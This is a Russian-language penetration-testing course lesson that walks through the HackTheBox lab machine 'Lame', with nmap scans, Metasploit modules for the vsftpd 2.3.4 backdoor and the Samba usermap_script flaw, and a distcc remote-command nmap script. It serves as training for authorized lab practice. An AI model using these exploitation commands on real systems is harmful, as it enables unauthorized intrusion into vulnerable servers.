# Занятие 52. HackTheBox (Easy): первая машина уровня Easy (Lame)

## Теория

После Starting Point переходим к реальным машинам уровня **Easy**. Это первый шаг к самостоятельному пентесту без подсказок.

**Машина Lame** — классика HTB, работает на Linux (Ubuntu). Уязвимости:
- **vsftpd 2.3.4** — бэкдор в FTP-сервере
- **Samba** — уязвимость в реализации SMB
- **distcc** — удаленное выполнение кода

**Методология пентеста (PTES):**
1. **Information Gathering** — сбор информации
2. **Vulnerability Analysis** — анализ уязвимостей
3. **Exploitation** — эксплуатация
4. **Post-Exploitation** — закрепление, повышение привилегий

**Формат флагов HTB:**
- `user.txt` — флаг пользователя (в домашней директории)
- `root.txt` — флаг root (в /root/)

## Практическое занятие

### Машина: Lame

**Шаг 1. Сканирование портов**
```bash
nmap -p- -T4 <target_ip>
nmap -sV -sC -p 21,22,139,445,3632 <target_ip>
```

Открытые порты:
- 21/tcp  — ftp (vsftpd 2.3.4)
- 22/tcp  — ssh
- 139/tcp — netbios-ssn (Samba)
- 445/tcp — netbios-ssn (Samba)
- 3632/tcp — distccd

**Шаг 2. Проверка FTP (vsftpd 2.3.4)**
Эта версия содержит известный бэкдор. Проверяем через Metasploit:
```bash
msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <target_ip>
exploit
```

**Шаг 3. Если бэкдор не сработал — проверяем Samba**
```bash
search samba
use exploit/multi/samba/usermap_script
set RHOSTS <target_ip>
set TARGET 0
exploit
```

**Шаг 4. Получение флагов**
```bash
cat /home/<user>/user.txt
cat /root/root.txt
```

**Шаг 5. Альтернативный путь через distcc**
```bash
nmap --script distcc-exec --script-args="distcc-exec.cmd='id'" -p 3632 <target_ip>
```

## Задачи для самостоятельного выполнения

1. **Машина "Legacy"** (Easy) — Windows XP, MS08-067 (аналог EternalBlue для старых систем)
2. **Машина "Nibbles"** (Easy) — веб-уязвимость в Nibbleblog CMS
3. **Машина "Shocker"** (Easy) — Shellshock (CVE-2014-6271), уязвимость bash

> **Важно:** Записывайте каждый шаг в отчет. Это пригодится для сертификации eJPT и OSCP.
